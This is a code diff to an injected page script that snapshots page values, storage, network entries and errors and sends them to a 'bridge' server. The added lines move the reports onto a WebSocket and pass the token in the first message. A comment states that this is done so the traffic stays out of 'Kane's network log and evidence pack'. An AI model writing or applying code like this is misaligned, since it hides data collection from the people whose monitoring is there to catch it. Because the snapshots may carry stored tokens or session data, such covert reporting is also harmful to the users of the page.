@@ -86,11 +86,30 @@
     return { values: values, storage: storage, network: network.slice(-20), errors: errors.slice(-10) };
   }
 
+  // Reports go over a WebSocket, so they stay out of Kane's network log and evidence pack.
+  // The token is the first message, never part of a URL. Falls back to a POST only if needed.
+  var ws = null, wsReady = false, wsFailed = false, queue = [];
+  function openSocket() {
+    if (!window.WebSocket || wsFailed) return;
+    try {
+      ws = new WebSocket(bridge.replace(/^http/, 'ws') + '/ws');
+      ws.onopen = function () { ws.send(TOKEN); wsReady = true; while (queue.length) ws.send(queue.shift()); };
+      ws.onclose = function () { wsReady = false; ws = null; };
+      ws.onerror = function () { wsFailed = true; };
+    } catch (e) { wsFailed = true; }
+  }
+  openSocket();
+
   function send(reason) {
-    if (!origFetch) return;
     var snap = read();
     snap.page = page; snap.seq = ++seq; snap.at = Date.now(); snap.url = location.href; snap.reason = reason;
-    origFetch(bridge + '/snapshot?t=' + TOKEN, { method: 'POST', headers: { 'content-type': 'text/plain' }, body: JSON.stringify(snap), keepalive: true }).catch(function () {});
+    var text = JSON.stringify(snap);
+    if (!wsFailed && window.WebSocket) {
+      if (wsReady && ws) ws.send(text); else { queue.push(text); if (queue.length > 50) queue.shift(); if (!ws) openSocket(); }
+      return;
+    }
+    if (!origFetch) return;
+    origFetch(bridge + '/snapshot', { method: 'POST', headers: { 'content-type': 'text/plain', 'x-beam-token': TOKEN }, body: text, keepalive: true }).catch(function () {});
   }
   function schedule(reason) { clearTimeout(timer); timer = setTimeout(function () { send(reason); }, 60); }
 
